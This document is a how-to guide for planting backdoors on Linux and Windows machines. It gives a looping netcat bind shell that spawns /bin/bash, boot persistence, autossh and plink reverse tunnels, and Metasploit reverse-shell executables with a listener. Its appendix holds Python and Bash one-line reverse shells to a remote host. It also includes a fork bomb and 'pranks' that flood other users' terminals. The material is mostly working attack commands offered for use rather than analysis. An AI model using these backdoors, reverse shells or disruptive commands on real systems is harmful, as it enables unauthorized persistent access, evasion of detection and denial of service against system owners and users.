# Setting Up a Netcat Backdoor on Linux

To ensure the program does not close after the first connection, use the following script:

```bash
#!/bin/bash
while [ 1 ]; do
    echo -n | netcat -l -v -p 445 -e /bin/bash
done
```

### Setup GNU Netcat Backdoor on Linux

1. Download and install Netcat:
   ```bash
   wget http://yourtookitsite.com/netcat
   cp netcat /usr/bin
   ```

2. Configure iptables to allow incoming and outgoing connections on port 445:
   ```bash
   iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 445 -j ACCEPT
   iptables -A OUTPUT -p tcp --dport 445 -m conntrack --ctstate NEW -j ACCEPT
   ```

3. Run the listener script in the background:
   ```bash
   nohup ./listener.sh &
   ```

### Have Netcat Start on Boot

- **/etc/rc.local**: This method is straightforward but may be easily noticed.
- **CentOS**:
  - Place the startup script in `/etc/rc.d/init.d/`.
- **Debian**:
  - Place the script in `/etc/rcN.d/` where `N` is the runlevel (e.g., `/etc/rc3.d/`).

### Connecting to the Backdoor

Use the following command to connect to the backdoor:
```bash
nc -v <ipaddress> <port>
```

### Viewing Programs with Open Ports

List programs with open ports:
```bash
netstat -lptun
```

### Linux Pranks

#### Iptables and Perl Script to Flip Images
- [Flip images](http://www.ex-parrot.com/pete/upside-down-ternet.html)

#### Linux Fork Bomb
```bash
:(){ :|:& };:
```

#### Write to User's Terminal
```bash
echo "Message" | write <username>
```

#### Send Random Noise
```bash
cat /dev/urandom > /dev/dsp
```

#### Change All Output to "Bork Bork"
```bash
perl -e '$b="bork"; while(){$l=`$_ 2>&1`; $l=~s/[A-Za-z]+/$b/g; print "$l$b\@$b:\$ ";}'
```

#### Send Star Wars to User's Terminal
```bash
telnet towel.blinkenlights.nl > /dev/pts/<number>
```

#### Cowsay to User's Terminal
```bash
fortune | cowsay > /dev/pts/<number>
```

#### Cmatrix to User's Terminal
```bash
cmatrix > /dev/pts/<number>
```

#### Constantly Write to a User's Console
```bash
while :; do sleep 60; echo "Follow the white rabbit."; done | write <username>
```

#### Command Bell
```bash
echo -e '\a'
```

#### Make `ls` Appear Broken
Add the following to `~/.bashrc`:
```bash
alias ls='echo "Segmentation fault"'
export PROMPT_COMMAND="ls"
```

### Disconnecting from a Process in Linux

- Use `nohup`:
  ```bash
  nohup command &
  ```
- Or:
  ```bash
  Ctrl-Z
  bg
  disown %1
  ```

### PHP Compilers

- **Bcompiler**: [Documentation](http://www.php.net/manual/en/book.bcompiler.php)
- **Phc**: [Website](http://www.phpcompiler.org/)
- **Ioncube**: [Website](http://www.ioncube.com/)
- **HHVM**: [Website](http://hhvm.com/)

### Netcat Limitations

- Easy to detect.
- Anyone who finds it on an open port can connect to it.
- Not encrypted.
- Requires significant setup and additional tools.

### Persistent SSH Tunnel

- **SSH Reverse Shell**: 
  - Register a VPS and set up a persistent SSH reverse shell.
  - Example command:
    ```bash
    ssh -f -N -R 10000:localhost:22 user@external_server
    ```

### Reverse SSH Tunneling

- **Options**:
  - `-N`: Do not execute a remote command.
  - `-f`: Go to background before command execution.
  - `-R [bind_address:]port:host:hostport`: Forward a port on the remote host to a local port.

### Generate SSH Key

```bash
ssh-keygen -t rsa
```

### Copy Generated Key to Remote Machine

```bash
ssh-copy-id -i /root/.ssh/id_rsa.pub -p 2222 user@remotemachine
```

### Use `autossh` for Persistence

- **Options**:
  - `-i /root/.ssh/syspub`: Location of SSH key.
  - `-M`: Monitoring port.
  - `-o "PubkeyAuthentication=yes"`: Use public key authentication.
  - `-o "PasswordAuthentication=no"`: Do not ask for password.

Example command:
```bash
autossh -M 10984 -N -f -o "PubkeyAuthentication=yes" -o "PasswordAuthentication=no" -i /root/.ssh/syspub -R 8888:localhost:22 user@remoteserver -p 2222 &
```

### SSH Reverse Tunnel on Windows Using `plink`

- **Options**:
  - `-P`: SSH server port.
  - `-l`: SSH server login name.
  - `-pw`: SSH server password.
  - `-C`: Enable compression.
  - `-R`: Forward remote port to local address.

Example command:
```bash
plink -P 22 -l username -pw password -C -R 5900:127.0.0.1:5900
```

### Secure Your SSH User

- Modify `/etc/passwd` to use a custom shell that disables access:
  ```bash
  user:x:300:300::/home/rshelluser:/usr/bin/disable_shell
  ```

- Create a custom shell script:
  ```bash
  #!/bin/bash
  trap '' 2 20 24
  clear
  echo -e ":P Sorry No Dice"
  while [ true ]; do
      sleep 500
  done
  exit 0
  ```

- Make the script executable:
  ```bash
  chmod +x /usr/bin/tunnel_shell
  ```

### Testing Your Reverse Shell

1. Create a user.
2. Generate SSH keys for the user.
3. Copy the SSH key for the user.
4. Modify `/etc/passwd` to use the custom shell.
5. Set up a cron job or use `autossh` to run the SSH reverse shell.

### Exploits vs Payloads vs Vulnerabilities

- **Vulnerabilities**: Places where you can take advantage of an operating system.
- **Exploits**: Methods to take advantage of vulnerabilities.
- **Payloads**: Actions performed once the exploit is executed.

### Using Metasploit

- **Setup**:
  - Install Metasploit (Kali has it by default).
  - Start the Metasploit console:
    ```bash
    msfconsole
    ```
  - Update Metasploit:
    ```bash
    msfupdate
    ```

### Generating a Binary Payload

- **Example**:
  ```bash
  msfpayload windows/shell_reverse_tcp LHOST=metasploit_server_ip LPORT=listening_port_on_server_ip X > payload.exe
  ```

- **Options**:
  - `O`: Show all options.
  - `X`: Save as a Windows Portable Executable.
  - `R`: Save in raw format.
  - `C`: Export as C code.
  - `J`: Export as Java code.

### Execute Binary on Target System

- **Generate and save the payload**:
  ```bash
  msfpayload windows/shell_reverse_tcp LHOST=10.10.10.123 LPORT=7777 X > /tmp/david_hasselhoff.exe
  ```

- **Set up Metasploit to listen**:
  ```bash
  msfconsole
  use exploit/multi/handler
  set payload windows/shell/reverse_tcp
  set LHOST 10.10.10.123
  set LPORT 7777
  exploit
  ```

### Appendix A: Code Library

- Contribute to the backdoor prank library on [GitHub](https://github.com/DC801/Introtobackdoors).

### Appendix B: One-Line Reverse Shells

- **Python**:
  ```python
  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
  ```

- **Bash**:
  ```bash
  bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
  ```

- **Netcat Listener**:
  ```bash
  nc -l -p 8080
  ```

### Appendix C: VPS for Remote Files and Reverse SSH

- **Sweden Dedicated**: [Website](http://swedendedicated.com/vps/)
- **NQHost**: [Website](http://nqhost.com/unmetered-xen-vps.html)

### Appendix D: Interesting Projects

- **Remote SSH Tunnel and Raspberry Pi**: [Project](http://www.tunnelsup.com/raspberry-pi-phoning-home-using-a-reverse-remote-ssh-tunnel)
- **Creating Undetectable SSH Backdoor Using Python**: [Article](http://resources.infosecinstitute.com/creating-undetectable-custom-ssh-backdoor-python-z/)